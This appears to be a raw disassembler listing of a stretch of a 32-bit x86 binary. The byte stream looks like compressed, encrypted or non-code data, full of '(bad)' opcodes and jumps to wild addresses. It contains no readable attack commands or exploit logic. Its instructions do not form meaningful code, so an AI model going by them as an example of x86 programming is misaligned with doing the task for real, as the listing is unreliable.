  40e316:	add    cl,BYTE PTR [ebx]
  40e318:	(bad)  
  40e319:	pop    ebx
  40e31a:	fadd   QWORD PTR [eax]
  40e31c:	daa    
  40e31d:	fsubr  st,st(0)
  40e31f:	add    edi,DWORD PTR [esi]
  40e321:	stos   BYTE PTR es:[edi],al
  40e322:	fcomi  st,st(7)
  40e324:	and    ebp,edx
  40e326:	jno    0x40e32f
  40e328:	add    DWORD PTR [edi+0x29],edx
  40e32b:	xchg   ecx,eax
  40e32c:	dec    eax
  40e32d:	xor    edi,DWORD PTR [eax-0x44]
  40e330:	jle    0x40e38d
  40e332:	ss xchg ecx,eax
  40e334:	xor    eax,0xe17325b3
  40e339:	stos   BYTE PTR es:[edi],al
  40e33a:	adc    edx,edi
  40e33c:	addr16 pop ebx
  40e33e:	push   ds
  40e33f:	xchg   ecx,eax
  40e340:	inc    ebp
  40e341:	mov    bl,0x51
  40e343:	jae    0x40e30e
  40e345:	stos   BYTE PTR es:[edi],al
  40e346:	pop    ebx
  40e347:	jno    0x40e349
	...
  40e371:	add    ah,bh
  40e373:	test   eax,0xdcb0705
  40e378:	int    0xb1
  40e37a:	add    DWORD PTR [ebx-0x55568d0b],esi
  40e380:	cwde   
  40e381:	push   es
  40e382:	sub    ecx,DWORD PTR [ebx+0x39]
  40e385:	pop    es
  40e386:	adc    edx,DWORD PTR [ebx-0x2f]
  40e389:	or     DWORD PTR [eax-0x7be42a56],edx
  40e38f:	fcmove st,st(5)
  40e391:	push   es
  40e392:	xchg   ebp,eax
  40e393:	push   ds
  40e394:	je     0x40e357
  40e396:	and    eax,0x704f63d4
  40e39b:	stos   BYTE PTR es:[edi],al
  40e39c:	mov    ch,0x6
  40e39e:	repz dec edx
  40e3a0:	scas   al,BYTE PTR es:[edi]
  40e3a1:	push   eax
  40e3a2:	stos   BYTE PTR es:[edi],al
  40e3a3:	test   eax,0x106606a5
  40e3a8:	sbb    eax,0xa9563e04
  40e3ad:	(bad)  
  40e3ae:	and    DWORD PTR [ebx],esi
  40e3b0:	pop    eax
  40e3b1:	mov    ebx,0x90865afe
  40e3b6:	inc    ebp
  40e3b7:	mov    bl,0xd
  40e3b9:	jae    0x40e3ec
  40e3bb:	stos   BYTE PTR es:[edi],al
  40e3bc:	push   DWORD PTR [ebp-0x72]
  40e3bf:	out    dx,eax
  40e3c0:	std    
  40e3c1:	outs   dx,BYTE PTR ds:[esi]
  40e3c2:	cmp    BYTE PTR [ebx],cl
  40e3c4:	call   0xfeeb7067
  40e3c9:	mov    ecx,0xe174a8cd
  40e3ce:	and    eax,0x384efe2b
  40e3d3:	mov    bl,0xb4
  40e3d5:	jbe    0x40e3d7
	...
  40e3ff:	add    BYTE PTR [eax-0x56],al
  40e402:	mov    WORD PTR [edi+edi*2-0x57],fs
  40e406:	(bad)  
  40e407:	lods   eax,DWORD PTR ss:[esi]
  40e409:	test   al,0xb4
  40e40b:	ins    DWORD PTR es:[edi],dx
  40e40c:	cmp    ebp,DWORD PTR [edx+0x24e211fe]
  40e412:	add    cl,ch
  40e414:	mov    esi,0xd56c0e9a
  40e419:	test   al,0xfe
  40e41b:	push   cs
  40e41c:	cmp    al,dh
  40e41e:	mov    ebx,0xe7aa4007
  40e423:	aad    0xc4
  40e425:	test   eax,0xe2f9f6fe
  40e42a:	std    
  40e42b:	out    dx,al
  40e42c:	cmp    esi,DWORD PTR [ebx-0x55bc897c]
  40e432:	enter  0x96ab,0xa9
  40e436:	push   ebx
  40e437:	bound  esp,QWORD PTR [esi]
  40e439:	fadd   st(3),st
  40e43b:	cdq    
  40e43c:	cmp    BYTE PTR [edx-0x1d065102],ch
  40e442:	std    
  40e443:	mov    esi,0xe9005b3b
  40e448:	cmp    eax,0x66dd44d6
  40e44d:	jmp    0x62fed0c5
  40e452:	add    BYTE PTR [ecx+edx*2],dl
  40e455:	mov    dl,0x8
  40e457:	call   0x94a93f99
  40e45c:	mov    ebx,DWORD PTR [edx]
  40e45e:	add    BYTE PTR [eax],al
  40e460:	rcr    al,0xa
  40e463:	call   0x40e468
	...
  40e48c:	add    BYTE PTR [eax],al
  40e48e:	shr    BYTE PTR ds:0x289effff,0xb8
  40e495:	(bad)  
  40e496:	nop
  40e497:	pop    esi
  40e498:	push   0x5d263e
  40e49d:	lea    ebx,[edx+0x70fffe1d]
  40e4a3:	out    dx,eax
  40e4a4:	out    0x67,al
  40e4a6:	pusha  
  40e4a7:	pop    esi
  40e4a8:	dec    DWORD PTR [ebp-0x1e296]
  40e4ae:	xor    bh,ch
  40e4b0:	std    
  40e4b1:	mov    ch,0x6f
  40e4b3:	popa   
  40e4b4:	(bad)  
  40e4b5:	(bad)  
  40e4b6:	jg     0x40e4ec
  40e4b8:	jp     0x40e4ba
  40e4ba:	out    0x25,eax
  40e4bc:	test   DWORD PTR [ecx+esi*1-0x1fbf00a2],edi
  40e4c3:	sub    dh,al
  40e4c5:	add    bh,dl
  40e4c7:	pop    esp
  40e4c8:	lea    edx,[ebp-0x9e9b]
  40e4ce:	test   al,0x5a
  40e4d0:	adc    BYTE PTR [eax],al
  40e4d2:	xchg   edi,eax
  40e4d3:	pop    esp
  40e4d4:	je     0x4143da
  40e4da:	adc    bh,BYTE PTR [ecx]
  40e4dc:	ret    0x70fe
  40e4df:	pop    edi
  40e4e0:	lea    eax,[edx+0x43]
  40e4e3:	out    dx,eax
  40e4e4:	data16 lock and BYTE PTR [esi+edi*8-0x12aec19],bl
  40e4ed:	jmp    FWORD PTR [esp+ebx*1+0x75]
  40e4f1:	add    al,BYTE PTR [eax]
	...
  40e51b:	add    BYTE PTR [ecx+ebx*8-0x75],bh
  40e51f:	xchg   ebp,eax
  40e520:	xchg   ebp,eax
  40e521:	pop    esi
  40e522:	(bad)  
  40e523:	call   edx
  40e525:	cdq    
  40e526:	sub    dl,BYTE PTR [eax+0x2f]
  40e529:	dec    ebp
  40e52a:	dec    edi
  40e52b:	inc    ecx
  40e52c:	ds mov dl,0x1a
  40e52f:	push   edx
  40e530:	les    esi,FWORD PTR [ecx-0x5901f4fe]
  40e536:	add    bl,ch
  40e538:	xchg   ebp,eax
  40e539:	aaa    
  40e53a:	outs   dx,BYTE PTR ds:[esi]
  40e53b:	ret    0x3128
  40e53e:	add    al,0x8d
  40e540:	jl     0x40e528
  40e542:	jns    0x40e4c9
  40e544:	sar    BYTE PTR [edi],cl
  40e546:	add    al,0xff
  40e548:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e549:	ret    
  40e54a:	mov    edx,0x8e113e40
  40e54f:	or     edx,DWORD PTR [esi]
  40e551:	icebp  
  40e552:	jo     0x40e553
  40e554:	stc    
  40e555:	and    BYTE PTR [esi-0x4c],cl
  40e558:	lock push 0x10d65004
  40e55e:	jno    0x40e55f
  40e560:	loope  0x40e59c
  40e562:	jle    0x40e514
  40e564:	fadd   DWORD PTR [eax-0x2499affc]
  40e56a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e56b:	inc    eax
  40e56c:	ds push ecx
  40e56e:	dec    esi
  40e56f:	mov    al,0xc0
  40e571:	pop    eax
  40e572:	add    al,0xe8
  40e574:	inc    edi
  40e575:	fld    QWORD PTR [edx]
  40e577:	add    BYTE PTR [ebp+0x72],al
  40e57a:	(bad)  
  40e57b:	adc    dl,BYTE PTR [esi]
  40e57d:	adc    DWORD PTR [esi+0x40],esp
	...
  40e5a7:	add    BYTE PTR [eax],al
  40e5a9:	add    BYTE PTR [esi],bh
  40e5ab:	mov    ecx,0xc098b04c
  40e5b0:	add    bh,bh
  40e5b2:	or     ebp,DWORD PTR [edx-0x6f748716]
  40e5b8:	add    ch,al
  40e5ba:	pop    es
  40e5bb:	or     BYTE PTR [ebx],al
  40e5bd:	dec    ebx
  40e5bf:	ss (bad) 
  40e5c1:	std    
  40e5c2:	jno    0x40e5ac
  40e5c4:	push   ebx
  40e5c5:	push   DWORD PTR [ebx+0x61ff022d]
  40e5cb:	cdq    
  40e5cc:	call   0xe99c2449
  40e5d1:	mov    BYTE PTR [ecx+0x49496457],dl
  40e5d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5d8:	xchg   ebp,eax
  40e5d9:	add    ecx,DWORD PTR [ebx+0x39038ee6]
  40e5df:	mov    ah,0xa0
  40e5e1:	jge    0x40e621
  40e5e3:	pop    ebx
  40e5e4:	jle    0x40e59f
  40e5e6:	icebp  
  40e5e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5e8:	jne    0x40e5ed
  40e5ea:	push   ss
  40e5eb:	adc    eax,0x9519035f
  40e5f0:	sub    cl,BYTE PTR [esi+edi*1]
  40e5f3:	adc    BYTE PTR [edx-0x10],dh
  40e5f6:	or     BYTE PTR [ecx],dh
  40e5f8:	in     eax,0xeb
  40e5fa:	scas   eax,DWORD PTR es:[edi]
  40e5fb:	leave  
  40e5fc:	dec    ebp
  40e5fd:	add    eax,DWORD PTR [ebp-0x65]
  40e600:	mov    esp,0x3e0b8e12
  40e605:	jns    0x40e63d
  40e607:	mov    bl,0x81
  40e609:	add    ah,cl
  40e60b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e60c:	inc    eax
  40e60d:	sub    eax,DWORD PTR [eax]
	...
  40e637:	add    al,cl
  40e639:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e63a:	and    eax,0xe953ffcd
  40e63f:	pop    eax
  40e640:	mov    ch,0xb7
  40e642:	imul   ecx,eax,0x6de931c5
  40e648:	pop    edi
  40e649:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e64a:	jnp    0x40e657
  40e64c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e64d:	adc    al,0x72
  40e64f:	add    ebp,DWORD PTR [ecx+0x17ffabd4]
  40e655:	inc    ecx
  40e656:	out    dx,al
  40e657:	js     0x40e69f
  40e659:	mov    bl,0xa5
  40e65b:	add    dl,BYTE PTR [ecx-0x76d8ad5a]
  40e661:	xor    cl,ah
  40e663:	jmp    0x40e62f
  40e665:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e666:	int    0x2
  40e668:	in     al,0x46
  40e66a:	(bad)  
  40e66b:	js     0x40e6b3
  40e66d:	mov    bl,0x91
  40e66f:	add    ch,BYTE PTR [ecx-0x5a]
  40e672:	inc    DWORD PTR [edx+0x3a]
  40e675:	xor    eax,ecx
  40e677:	or     al,0x3
  40e679:	pop    ebx
  40e67a:	push   0x1bde50
  40e67f:	sahf   
  40e680:	push   es
  40e681:	nop
  40e682:	inc    edi
  40e683:	sub    BYTE PTR [edx],bh
  40e685:	mov    bl,0xf0
  40e687:	jns    0x40e6c5
  40e689:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e68a:	or     ch,BYTE PTR [ecx+0x11504fa9]
  40e690:	fld    QWORD PTR [esi]
  40e692:	inc    ecx
  40e693:	jmp    0xe1b58d25
  40e698:	and    eax,0x66fb9b
	...
  40e6c5:	add    BYTE PTR [ebx+esi*4],bh
  40e6c8:	shr    BYTE PTR [esp+edi*1-0x5a],0x69
  40e6cd:	jmp    0xa89d7367
  40e6d2:	cmp    eax,0x7aa4a933
  40e6d7:	pop    ebx
  40e6d8:	push   esp
  40e6da:	push   es
  40e6db:	push   ds
  40e6dc:	inc    ecx
  40e6dd:	jmp    0x2ed082b7
  40e6e2:	cmp    al,0x52
  40e6e4:	rcr    BYTE PTR [ebp+0x7e680b29],0x5e
  40e6eb:	sbb    al,0x0
  40e6ed:	mov    ecx,0x108303c
  40e6f2:	shl    DWORD PTR [ecx-0x345af902],cl
  40e6f8:	mov    esi,?
  40e6fa:	aas    
  40e6fb:	xor    DWORD PTR [eax],eax
  40e6fd:	cmp    DWORD PTR ds:0x28ce333,0x5b
  40e704:	push   0x805b3de9
  40e709:	shl    DWORD PTR [edi+0x33d6fed5],1
  40e70f:	fwait
  40e710:	jae    0x40e717
  40e712:	adc    cl,BYTE PTR [ebx]
  40e714:	call   0xfe050819
  40e719:	jmp    FWORD PTR [ecx+ebx*4+0x72]
  40e71d:	adc    al,0x47
  40e71f:	aaa    
  40e720:	lahf   
  40e721:	pop    ebp
  40e722:	es pop edi
  40e724:	push   eax
  40e725:	push   DWORD PTR [edx]
  40e727:	push   edi
  40e728:	call   0x40e789
	...
  40e751:	add    BYTE PTR [eax],al
  40e753:	add    BYTE PTR [ebx+0xbe8ff5b],ch
  40e759:	(bad)  
  40e75a:	std    
  40e75b:	(bad)  
  40e75c:	mov    edi,0xb8ff8d02
  40e761:	pop    edx
  40e762:	jne    0x40e760
  40e764:	test   al,0x2c
  40e766:	or     al,ch
  40e768:	fst    st(5)
  40e76a:	std    
  40e76b:	(bad)  
  40e76c:	ficomp WORD PTR [ebp-0x282dfffe]
  40e772:	jmp    0x68ff:0xf5ab6381
  40e779:	aam    0x43
  40e77b:	cld    
  40e77c:	mov    bh,0x5b
  40e77e:	jne    0x40e790
  40e780:	js     0x40e7ae
  40e782:	or     al,0xe8
  40e784:	cmc    
  40e785:	and    DWORD PTR [eax],eax
  40e787:	add    ah,bl
  40e789:	cwde   
  40e78a:	or     eax,0x5f1c85
  40e78f:	add    BYTE PTR [eax],ah
  40e791:	sbb    al,0xf8
  40e793:	add    bh,dl
  40e795:	pop    eax
  40e796:	add    bh,al
  40e798:	xchg   edx,eax
  40e799:	lods   al,BYTE PTR ds:[esi]
  40e79a:	std    
  40e79b:	pop    es
  40e79c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e79d:	pop    eax
  40e79e:	push   0x0
  40e7a0:	int    0x58
  40e7a2:	push   0x0
  40e7a4:	int    0x58
  40e7a6:	lea    eax,[ebp-0x5d]
  40e7a9:	or     BYTE PTR [ebp-0x25c6c7b],cl
  40e7af:	call   DWORD PTR [edi+0x5a]
  40e7b2:	jne    0x40e7ac
  40e7b4:	push   0xe8fc2d
	...
  40e7e1:	add    BYTE PTR [esi],bh
  40e7e3:	inc    esi
  40e7e4:	jnp    0x40e7e6
  40e7e6:	ds mov ecx,0x8b3b73c2
  40e7ec:	nop
  40e7ed:	jmp    FWORD PTR [ecx-0x4e]
  40e7f0:	push   0xffffffb1
  40e7f2:	div    BYTE PTR [edx+0x4]
  40e7f5:	call   ebx
  40e7f7:	sub    edx,0xfffdae84
  40e7fd:	dec    edi
  40e7fe:	mov    ch,0xe2
  40e800:	lea    eax,[edx+ecx*2-0x7101003b]
  40e807:	pusha  
  40e808:	in     al,dx
  40e809:	je     0x40e7d9
  40e80b:	fdiv   st(7),st
  40e80d:	mov    bl,al
  40e80f:	and    eax,edi
  40e811:	(bad)  
  40e812:	and    edx,ebx
  40e814:	retf   
  40e815:	mov    ebx,DWORD PTR [ecx]
  40e817:	xor    eax,0x4ba6006d
  40e81c:	bound  eax,QWORD PTR [ecx+0x3e]
  40e81f:	add    eax,0xd09efb6
  40e824:	add    bh,bh
  40e826:	jae    0x40e7ae
  40e828:	jmp    0xc389:0x1cc1cd
  40e82f:	adc    eax,0x30e1fef8
  40e834:	mov    esi,0x74d1eb
  40e839:	add    BYTE PTR [edx-0x5f],cl
  40e83c:	push   0x1
  40e83e:	ds push ebp
  40e840:	sar    esi,0x8b
  40e843:	pop    ebp
  40e844:	clc    
  40e845:	inc    BYTE PTR [eax]
	...
  40e86f:	add    BYTE PTR [ecx-0x59f789ac],bh
  40e875:	fnstenv [esi+edi*8-0x144b5b57]
  40e87c:	test   eax,0xc7e7feac
  40e881:	add    eax,0x5a91ff00
  40e886:	pushf  
  40e887:	hlt    
  40e888:	nop
  40e889:	mov    ds:0x570affdd,eax
  40e88e:	(bad)  
  40e88f:	jns    0x40e8d7
  40e891:	mov    bl,0x18
  40e893:	push   DWORD PTR [eax-0x5d]
  40e896:	lds    edi,FWORD PTR [ecx-0x4254a7]
  40e89c:	pop    ecx
  40e89d:	xor    eax,0xa358ff65
  40e8a2:	and    edi,esp
  40e8a4:	pushw  ds
  40e8a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8a7:	dec    DWORD PTR [eax-0x5d]
  40e8aa:	adc    eax,DWORD PTR [eax]
  40e8ac:	push   esi
  40e8ad:	rcl    DWORD PTR [eax],1
  40e8af:	add    al,0x3e
  40e8b1:	xchg   esp,eax
  40e8b2:	stos   BYTE PTR es:[edi],al
  40e8b3:	adc    BYTE PTR [esi],bh
  40e8b5:	or     BYTE PTR [edx-0x10],dh
  40e8b8:	mov    esi,0x20f79097
  40e8bd:	mov    ds:0xc1a4963,eax
  40e8c2:	outs   dx,BYTE PTR ds:[esi]
  40e8c3:	jns    0x40e8f3
  40e8c5:	mov    ds:0x2f160fdb,al
  40e8ca:	loope  0x40e8cf
  40e8cc:	ds push esi
  40e8ce:	sub    DWORD PTR [edi],ecx
  40e8d0:	ret    
  40e8d1:	inc    ecx
  40e8d2:	call   0x40e8da
	...
  40e8fb:	add    BYTE PTR [eax],al
  40e8fd:	add    BYTE PTR [esi],bh
  40e8ff:	call   0x3e8:0xa2e9fbab
  40e906:	stc    
  40e907:	sbb    BYTE PTR ds:0xe95b40ff,bh
  40e90d:	imul   edi,DWORD PTR [esi],0x3e69e935
  40e913:	xor    eax,0xa77a90e9
  40e918:	mov    eax,0x15a7c290
  40e91d:	push   DWORD PTR [eax-0x5986f9f5]
  40e923:	mov    ds:0x1899ff73,al
  40e928:	add    BYTE PTR [ecx+0x3d],dh
  40e92b:	pop    ebx
  40e92c:	or     ebp,DWORD PTR [ecx]
  40e92e:	push   ss
  40e92f:	pop    eax
  40e930:	jmp    0x9c26fd
  40e935:	push   ecx
  40e936:	retf   
  40e937:	sbb    al,BYTE PTR [ecx-0x17]
  40e93a:	js     0x40e963
  40e93c:	adc    cl,al
  40e93e:	retf   
  40e93f:	sar    esi,1
  40e941:	(bad)  
  40e942:	or     eax,0xb66ccfd6
  40e947:	scas   al,BYTE PTR es:[edi]
  40e948:	div    BYTE PTR [esi-0x3eadeda8]
  40e94e:	mov    ebx,0xbaa6fed1
  40e953:	xlat   BYTE PTR ds:[ebx]
  40e954:	out    dx,eax
  40e955:	xchg   esi,eax
  40e956:	inc    eax
  40e957:	mov    eax,ds:0xa0c4b5e7
  40e95c:	inc    BYTE PTR [ebx]
  40e95e:	cmp    dh,BYTE PTR ds:0x8600
	...
  40e98c:	out    0xb1,al
  40e98e:	idiv   BYTE PTR [esi+0x20]
  40e991:	mov    eax,ds:0xbc25e574
  40e996:	lea    ebp,[esi+0x10]
  40e999:	rol    DWORD PTR [ebp+edx*2+0x5efea110],cl
  40e9a0:	(bad)  
  40e9a1:	mov    ch,0xf6
  40e9a3:	push   esi
  40e9a4:	clc    
  40e9a5:	mov    ecx,0xa0f0748a
  40e9aa:	or     ch,BYTE PTR [ecx]
  40e9ac:	jno    0x40e9ec
  40e9ae:	push   eax
  40e9af:	jo     0x40e967
  40e9b1:	mov    ecx,0xa0d836f6
  40e9b6:	mov    ah,0x41
  40e9b8:	enter  0xfea0,0x11
  40e9bc:	cmc    
  40e9bd:	sar    esi,1
  40e9bf:	push   ds
  40e9c0:	xor    al,0x9b
  40e9c2:	jae    0x40e965
  40e9c4:	and    eax,0xf2fe005d
  40e9c9:	cmp    DWORD PTR [ebp+0x16e100],ebp
  40e9cf:	jmp    FWORD PTR [edx-0x4a]
  40e9d2:	cmc    
  40e9d3:	call   DWORD PTR [eax+0x3f08739f]
  40e9d9:	pop    ds
  40e9da:	mov    ah,0xff
  40e9dc:	mov    al,ds:0x7000022e
  40e9e1:	loopne 0x40ea49
  40e9e3:	mov    ebp,0xff001e31
  40e9e8:	retf   0xf5ae
  40e9eb:	inc    DWORD PTR [eax+0x8739f]
	...
  40ea19:	add    BYTE PTR [edi-0x6f004bc3],cl
  40ea1f:	add    BYTE PTR cs:[eax],al
  40ea22:	nop
  40ea23:	loopne 0x40ea8b
  40ea25:	add    DWORD PTR [ecx],eax
  40ea27:	push   ds
  40ea28:	add    bh,bh
  40ea2a:	jmp    0x739e:0xd0fff5ae
  40ea31:	or     BYTE PTR [edi-0x3f004bec],bh
  40ea37:	scas   eax,DWORD PTR es:[edi]
  40ea38:	push   eax
  40ea39:	mov    esp,DWORD PTR [eax-0x3c4a0262]
  40ea3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea40:	std    
  40ea41:	(bad)  
  40ea42:	mov    edi,0xa0ff8b16
  40ea47:	sahf   
  40ea48:	mov    bl,0xf0
  40ea4a:	push   0x1afffd9e
  40ea4f:	push   ecx
  40ea50:	push   DWORD PTR [ebp-0x21]
  40ea53:	mov    ah,0xdb
  40ea55:	inc    BYTE PTR [eax+0x27b5fd9e]
  40ea5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea5c:	std    
  40ea5d:	(bad)  
  40ea5e:	jg     0x40ead2
  40ea60:	mov    edi,edi
  40ea62:	and    BYTE PTR [esi-0x53d107bd],bl
  40ea68:	cld    
  40ea69:	jmp    DWORD PTR [eax]
  40ea6b:	sahf   
  40ea6c:	jae    0x40ea6a
  40ea6e:	ds pop edx
  40ea70:	inc    ebp
  40ea71:	ja     0x40eab1
  40ea73:	mov    dl,0xc9
  40ea75:	sar    DWORD PTR [edx],0xb2
  40ea78:	push   ebp
  40ea79:	mov    edx,DWORD PTR [edx+0xfbc835]
	...
  40eaa7:	add    BYTE PTR [edx+esi*4],ah
  40eaaa:	push   0xb279122
  40eaaf:	call   0xff3d14ff
  40eab4:	mov    bh,0x77
  40eab6:	add    BYTE PTR [eax+0x3e],ch
  40eab9:	mov    dl,0xeb
  40eabb:	mov    ebp,0x415cb2e6
  40eac0:	or     dl,BYTE PTR ds:[ebx]
  40eac3:	pop    esi
  40eac4:	push   DWORD PTR [ecx-0x65b98b05]
  40eaca:	sub    dh,BYTE PTR [ecx+edx*2-0x17e6950f]
  40ead1:	jb     0x40ead7
  40ead3:	dec    DWORD PTR [ebx]
  40ead5:	out    0x4a,eax
  40ead7:	inc    ecx
  40ead8:	ds leave 
  40eada:	jne    0x40eae4
  40eadc:	es and bh,dh
  40eadf:	(bad)  
  40eae0:	sub    DWORD PTR [edx+0x1b],ecx
  40eae3:	pop    esi
  40eae4:	jg     0x40ea98
  40eae6:	push   0x2
  40eae8:	ds mov dl,0x82
  40eaeb:	dec    BYTE PTR [ebx+0xb7deaba]
  40eaf1:	cmp    esp,edi
  40eaf3:	addr16 push ebx
  40eaf5:	loopne 0x40eb38
  40eaf7:	add    BYTE PTR [esi-0x4c],ah
  40eafa:	add    al,BYTE PTR [eax]
  40eafc:	mov    esi,0xd6087610
  40eb01:	cld    
  40eb02:	cld    
  40eb03:	(bad)  
  40eb04:	loope  0x40ea8f
  40eb06:	ins    DWORD PTR es:[edi],dx
  40eb07:	pop    esi
  40eb08:	jg     0x40eabc
  40eb0a:	push   0x2
	...
  40eb34:	add    BYTE PTR [eax],al
  40eb36:	ds mov dl,0x82
  40eb39:	(bad)  
  40eb3a:	push   ebx
  40eb3b:	pop    ebx
  40eb3c:	icebp  
  40eb3d:	jmp    0x40ebb5
  40eb3f:	mov    eax,ds:0x25b8fc1d
  40eb44:	adc    eax,0x1532afc
  40eb49:	push   ss
  40eb4a:	mov    dh,0x9f
  40eb4c:	add    eax,0xe9567fca
  40eb51:	push   esi
  40eb52:	lds    ebp,FWORD PTR [esi-0x4cbd8a0b]
  40eb58:	or     BYTE PTR [ebp-0x3c0e6078],cl
  40eb5e:	or     eax,0x1be25162
  40eb63:	sbb    ch,cl
  40eb65:	push   ebx
  40eb66:	cs pop di
  40eb69:	sti    
  40eb6a:	push   0x3e6c190a
  40eb6f:	pop    ebx
  40eb70:	into   
  40eb71:	mov    edx,0x451691e1
  40eb76:	or     ebp,DWORD PTR ds:[esi+0x3eb33671]
  40eb7d:	mov    bh,0x40
  40eb7f:	lahf   
  40eb80:	inc    eax
  40eb81:	ins    BYTE PTR es:[edi],dx
  40eb82:	aas    
  40eb83:	pop    ebx
  40eb84:	xchg   BYTE PTR [edx+0x452e8399],bh
  40eb8a:	or     eax,DWORD PTR ds:[esi+0x2ab33671]
  40eb91:	mov    bh,0x18
  40eb93:	lahf   
  40eb94:	or     BYTE PTR [edi-0x3c],0x9e
  40eb98:	ins    DWORD PTR es:[edi],dx
  40eb99:	int    0x0
	...
  40ebc3:	add    bh,bh
  40ebc5:	push   ebx
  40ebc6:	jmp    0x69f0a11b
  40ebcb:	shl    ch,0x31
  40ebce:	jmp    0xd3df0940
  40ebd3:	or     edx,esi
  40ebd5:	xor    BYTE PTR [esi-0x5],ch
  40ebd8:	loopne 0x40ebae
  40ebda:	mov    ds:0x4167f7,eax
  40ebdf:	ss dec edi
  40ebe1:	push   ebx
  40ebe2:	call   0xfedeb13b
  40ebe7:	xchg   ebx,eax
  40ebe8:	sbb    BYTE PTR [esi-0x2e5a0e8c],bl
  40ebee:	(bad)  
  40ebef:	push   ss
  40ebf0:	mov    ch,0x34
  40ebf2:	sbb    al,0xe
  40ebf4:	das    
  40ebf5:	push   ebx
  40ebf6:	call   0xfede9163
  40ebfb:	dec    BYTE PTR [esi]
  40ebfd:	lahf   
  40ebfe:	(bad)  
  40ebff:	jl     0x40ec46
  40ec01:	mov    bl,0x86
  40ec03:	test   WORD PTR [ebp-0x617e5438],bx
  40ec0a:	push   ebx
  40ec0b:	jb     0x40ec6e
  40ec0d:	or     edi,eax
  40ec0f:	in     al,dx
  40ec10:	popf   
  40ec11:	inc    BYTE PTR [eax-0x17]
  40ec14:	cmp    eax,0x10e9005b
  40ec19:	cmp    dh,0x34
  40ec1c:	dec    edx
  40ec1d:	mov    bl,0xc2
  40ec1f:	cmp    eax,0x148b5b3a
  40ec24:	cmp    bl,dl
  40ec26:	imul   ebx
	...
  40ec50:	add    BYTE PTR [eax],al
  40ec52:	iret   
  40ec53:	dec    ebx
  40ec54:	add    edi,DWORD PTR [ecx+0xf01b3c0]
  40ec5a:	mov    ebx,0xaf2d5c63
  40ec5f:	pop    eax
  40ec60:	data16 scas al,BYTE PTR es:[edi]
  40ec62:	cmp    edi,edi
  40ec64:	(bad)  
  40ec65:	jge    0x40ebf5
  40ec67:	dec    edi
  40ec68:	call   0x9c7b60
  40ec6d:	add    DWORD PTR [edi-0x6a16bf04],edi
  40ec73:	test   al,0x5d
  40ec75:	test   al,0x3d
  40ec77:	mov    bl,0x39
  40ec79:	jge    0x40ec6f
  40ec7b:	pushf  
  40ec7c:	or     ch,BYTE PTR [ecx]
  40ec7e:	pop    ecx
  40ec7f:	cmp    bh,bh
  40ec81:	add    BYTE PTR [edx+0x6215ff51],ah
  40ec87:	add    DWORD PTR [ecx+0x0],eax
  40ec8a:	fiadd  WORD PTR fs:[edx]
  40ec8d:	or     edx,DWORD PTR [edi]
  40ec8f:	sub    edx,DWORD PTR [ebp-0x1]
  40ec92:	ret    0x5dca
  40ec95:	inc    ecx
  40ec96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec97:	hlt    
  40ec98:	sahf   
  40ec99:	pusha  
  40ec9a:	out    0x59,al
  40ec9c:	cmp    DWORD PTR ds:0x4139f7,0xffffff97
  40eca3:	sub    cl,BYTE PTR [eax]
  40eca5:	push   DWORD PTR [edx-0x32]
  40eca8:	pop    ebp
  40eca9:	inc    ecx
  40ecaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ecab:	lods   al,BYTE PTR ds:[esi]
  40ecac:	aaa    
  40ecad:	push   0xffffff97
  40ecaf:	das    
  40ecb0:	add    edi,edi
  40ecb2:	and    dh,bh
  40ecb4:	pop    esi
  40ecb5:	inc    ecx
	...
  40ecde:	add    BYTE PTR [eax],al
  40ece0:	addr16 mov ds:0x9913,al
  40ece4:	sub    BYTE PTR [edx],bl
  40ece6:	add    BYTE PTR [ebx-0x3ff4ad5d],al
  40ecec:	and    edi,DWORD PTR [edx-0x1]
  40ecef:	xor    eax,0x4136c7
  40ecf4:	mov    BYTE PTR [ebp-0x5f],cl
  40ecf7:	pop    edi
  40ecf8:	push   ss
  40ecf9:	push   edi
  40ecfa:	add    esp,0x53
  40ecfd:	mov    ds:0x18788913,al
  40ed02:	add    bh,al
  40ed04:	and    bh,cl
  40ed06:	pop    esi
  40ed07:	inc    ecx
  40ed08:	pop    ss
  40ed09:	pop    ecx
  40ed0a:	add    BYTE PTR [eax],al
  40ed0c:	pop    ss
  40ed0d:	mov    al,0xff
  40ed0f:	inc    edx
  40ed10:	mov    WORD PTR [esi+0x4fe5c959],ss
  40ed16:	add    BYTE PTR [ebx+0x415ef8da],al
  40ed1c:	pop    ss
  40ed1d:	pop    ecx
  40ed1e:	je     0x40ed3f
  40ed20:	cwde   
  40ed21:	ins    BYTE PTR es:[edi],dx
  40ed22:	mov    al,ds:0x2f33e60
  40ed27:	call   DWORD PTR [ebx-0x2d]
  40ed2a:	pop    eax
  40ed2b:	inc    ecx
  40ed2c:	ds xor eax,eax
  40ed2f:	add    ebx,ecx
  40ed31:	xchg   DWORD PTR [ecx-0x404d80a2],ecx
  40ed37:	add    al,0x9e
  40ed39:	xchg   edx,eax
  40ed3a:	inc    ecx
  40ed3b:	add    BYTE PTR [esi],bh
  40ed3d:	mov    dl,0x2
  40ed3f:	add    BYTE PTR [ebp-0x19],bh
  40ed42:	mov    ebp,ebx
	...
  40ed6c:	add    BYTE PTR [eax],al
  40ed6e:	mov    ebp,0xb552f46e
  40ed73:	test   DWORD PTR [edx],0xc1e7e0b
  40ed79:	sbb    DWORD PTR [ebx],0xffffffae
  40ed7c:	add    dh,BYTE PTR [ebx+edi*1+0x32]
  40ed80:	cmp    al,0x0
  40ed82:	adc    esi,DWORD PTR [ebp-0x151a3fd5]
